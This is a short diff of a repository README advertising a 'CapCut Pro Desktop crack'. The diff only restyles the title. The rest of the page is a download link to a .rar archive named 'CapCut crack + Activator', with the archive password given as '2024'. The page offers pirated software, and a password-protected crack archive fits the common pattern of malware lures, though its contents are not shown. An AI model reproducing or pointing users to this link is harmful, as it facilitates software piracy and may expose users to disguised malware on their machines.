@@ -1,4 +1,4 @@
-# CapCut Pro Desktop crack
+# <h1 align="center">CapCut Pro Desktop crack</h1>
 # [DOWNLOAD](https://github.com/DahvidCahyonoPutro/CapCut-Desktop-crack/raw/refs/heads/main/CapCut%20crack%20+%20Activator.rar)
 # Archive password: 2024
 
